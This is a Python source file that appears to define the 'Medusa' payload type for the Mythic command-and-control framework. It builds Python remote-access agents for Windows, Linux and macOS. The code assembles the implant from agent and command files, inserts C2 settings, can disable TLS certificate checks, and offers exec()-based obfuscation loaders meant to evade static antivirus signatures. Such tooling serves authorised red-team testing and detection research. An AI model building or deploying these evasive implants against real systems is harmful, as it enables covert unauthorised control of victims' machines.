from mythic_container.PayloadBuilder import *
from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *

import asyncio, pathlib, os, tempfile, base64, hashlib, json

from itertools import cycle

class Medusa(PayloadType):

    name = "medusa" 
    file_extension = "py"
    author = "@ajpc500"
    supported_os = [  
        SupportedOS.Windows, SupportedOS.Linux, SupportedOS.MacOS
    ]
    wrapper = False  
    wrapped_payloads = ["pickle_wrapper"]  
    mythic_encrypts = True
    note = "This payload uses Python to create a simple agent"
    supports_dynamic_loading = True
    build_parameters = [
        BuildParameter(
            name="output",
            parameter_type=BuildParameterType.ChooseOne,
            description="Choose output format",
            choices=["py", "base64"],
            default_value="py"
        ),
        BuildParameter(
            name="python_version",
            parameter_type=BuildParameterType.ChooseOne,
            description="Choose Python version",
            choices=["Python 3.8", "Python 2.7"],
            default_value="Python 3.8"
        ),
        BuildParameter(
            name="use_non_default_cryptography_lib",
            parameter_type=BuildParameterType.ChooseOne,
            description="Use non-default 'cryptography' Python library for comms (if not, manual crypto will be used)",
            choices=["No", "Yes"],
            default_value="No"
        ),
        BuildParameter(
            name="obfuscate_script",
            parameter_type=BuildParameterType.ChooseOne,
            description="Choose obfuscation method for agent code",
            choices=["None", "Random", "GetAttr", "Lambda", "Map"],
            default_value="None"
        ),
        BuildParameter(
            name="https_check",
            parameter_type=BuildParameterType.ChooseOne,
            description="Verify HTTPS certificate (if HTTP, leave yes)",
            choices=["Yes", "No"],
            default_value="Yes"
        ),
          BuildParameter(
            name="domain_check",
            parameter_type=BuildParameterType.String,
            description="Verify AD domain (if not joined, will exit)",
            value="",
            default_value=""
          )
    ]
    c2_profiles = ["http"]
    
    agent_path = pathlib.Path(".") / "medusa" / "mythic"
    agent_icon_path = agent_path / "medusa.svg"
    agent_code_path = pathlib.Path(".") / "medusa" / "agent_code"
    
    build_steps = [
        BuildStep(step_name="Gathering Files", step_description="Creating script payload"),
        BuildStep(step_name="Obfuscating Script", step_description="Encoding and encrypting script content")
    ]

    translation_container = None

    def getPythonVersionFile(self, directory, file):
        pyv = self.get_parameter("python_version")
        filename = ""
        if os.path.exists(os.path.join(directory, "{}.py".format(file))):
            #while we've specified a python version, this function is agnostic so just return the .py
            filename = os.path.join(directory, "{}.py".format(file))
        elif pyv == "Python 2.7":
            filename = os.path.join(directory, "{}.py2".format(file))
        elif pyv == "Python 3.8":
            filename = os.path.join(directory, "{}.py3".format(file))
            
        if not os.path.exists(filename) or not filename:
            return ""
        else:
            return filename         

    async def build(self) -> BuildResponse:
        # this function gets called to create an instance of your payload
        resp = BuildResponse(status=BuildStatus.Success)
        # create the payload
        build_msg = ""
        try:
            command_code = ""
            for cmd in self.commands.get_commands():
                command_path = self.getPythonVersionFile(self.agent_code_path, cmd)
                if not command_path:
                    build_msg += "{} command not available for {}.\n".format(cmd, self.get_parameter("python_version"))
                else:
                    command_code += (
                        open(command_path, "r").read() + "\n"
                    )
            base_code = open(
                self.getPythonVersionFile(os.path.join(self.agent_code_path, "base_agent"), "base_agent"), "r"
            ).read()

            if self.get_parameter("use_non_default_cryptography_lib") == "Yes":
                crypto_code = open(self.getPythonVersionFile(os.path.join(self.agent_code_path, "base_agent"), "crypto_lib"), "r").read()
            else:
                crypto_code = open(self.getPythonVersionFile(os.path.join(self.agent_code_path, "base_agent"), "manual_crypto"), "r").read()

            base_code = base_code.replace("CRYPTO_HERE", crypto_code)
            base_code = base_code.replace("UUID_HERE", self.uuid)
            base_code = base_code.replace("#COMMANDS_HERE", command_code)
            domain_check = ""
            if self.get_parameter("domain_check") != "":
                domain_check = self.get_parameter("domain_check")
            base_code = base_code.replace("#DOMAIN_CHECK_HERE", domain_check)

            for c2 in self.c2info:
                profile = c2.get_c2profile()["name"]
                
                for key, val in c2.get_parameters_dict().items():
                    # if key == "AESPSK":
                    #     base_code = base_code.replace(key, val["enc_key"] if val["enc_key"] is not None else "")
                    # el
                    if not isinstance(val, str):
                        base_code = base_code.replace(key, \
                            json.dumps(val).replace("false", "False").replace("true","True").replace("null","None")
                        )
                    else:
                        base_code = base_code.replace(key, val)

            if self.get_parameter("https_check") == "No":
                base_code = base_code.replace("urlopen(req)", "urlopen(req, context=gcontext)")
                base_code = base_code.replace("#CERTSKIP", 
                """
        gcontext = ssl.create_default_context()
        gcontext.check_hostname = False
        gcontext.verify_mode = ssl.CERT_NONE\n""")
            else:
                base_code = base_code.replace("#CERTSKIP", "")

            if build_msg != "":
                resp.build_stderr = build_msg
                resp.set_status(BuildStatus.Error)

            await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                PayloadUUID=self.uuid,
                StepName="Gathering Files",
                StepStdout="Found all files for payload",
                StepSuccess=True
            ))

            obfuscation_method = self.get_parameter("obfuscate_script")
            if obfuscation_method != "None":
                # Use a multi-layer obfuscation approach to avoid static signatures
                import random, string, zlib
                
                # Generate random variable names
                var1 = ''.join(random.choices(string.ascii_letters, k=8))
                var2 = ''.join(random.choices(string.ascii_letters, k=8))
                var3 = ''.join(random.choices(string.ascii_letters, k=8))
                var4 = ''.join(random.choices(string.ascii_letters, k=8))
                
                # Step 1: Compress the code
                compressed_code = zlib.compress(base_code.encode())
                
                # Step 2: Apply multiple transformations
                # ROT13-like transformation with random offset
                rot_offset = random.randint(1, 25)
                transformed = bytearray()
                for byte in compressed_code:
                    # Apply rotation with wrapping
                    new_byte = ((byte + rot_offset) % 256)
                    transformed.append(new_byte)
                
                # Step 3: Encode with base85 (less common than base64)
                import base64
                encoded_content = base64.b85encode(bytes(transformed))
                
                # Step 4: Create obfuscated loader based on selected method
                loader_templates = {
                    "GetAttr": """import zlib as {var1}, base64 as {var2}
{var3} = getattr({var2}, 'b85decode')
{var4} = bytes(((x - {rot_offset}) % 256) for x in {var3}({encoded_content}))
exec(getattr({var1}, 'decompress')({var4}).decode())""",
                    
                    "Lambda": """import zlib, base64
{var3} = lambda x: bytes(((b - {rot_offset}) % 256) for b in base64.b85decode(x))
{var4} = zlib.decompress({var3}({encoded_content})).decode()
exec({var4})""",
                    
                    "Map": """import zlib, base64
{var3} = list(map(lambda x: (x - {rot_offset}) % 256, base64.b85decode({encoded_content})))
{var4} = zlib.decompress(bytes({var3}))
exec({var4}.decode())"""
                }
                
                # Select template based on user choice or random
                if obfuscation_method == "Random":
                    selected_template = random.choice(list(loader_templates.values()))
                    method_name = "Random (" + random.choice(list(loader_templates.keys())) + ")"
                else:
                    selected_template = loader_templates[obfuscation_method]
                    method_name = obfuscation_method
                
                base_code = selected_template.format(
                    var1=var1, var2=var2, var3=var3, var4=var4,
                    rot_offset=rot_offset, encoded_content=encoded_content
                )

                await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                    PayloadUUID=self.uuid,
                    StepName="Obfuscating Script",
                    StepStdout=f"Script successfully obfuscated using {method_name} method.",
                    StepSuccess=True
                ))
            else:
                await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                    PayloadUUID=self.uuid,
                    StepName="Obfuscating Script",
                    StepStdout="Obfuscation not requested, skipping.",
                    StepSuccess=True
                ))

            if self.get_parameter("output") == "base64":
                resp.payload = base64.b64encode(base_code.encode())
                resp.build_message = "Successfully Built"
            else:
                resp.payload = base_code.encode()
                resp.build_message = "Successfully built!"
        except Exception as e:
            resp.set_status(BuildStatus.Error)
            resp.build_stderr = "Error building payload: " + str(e)
        return resp

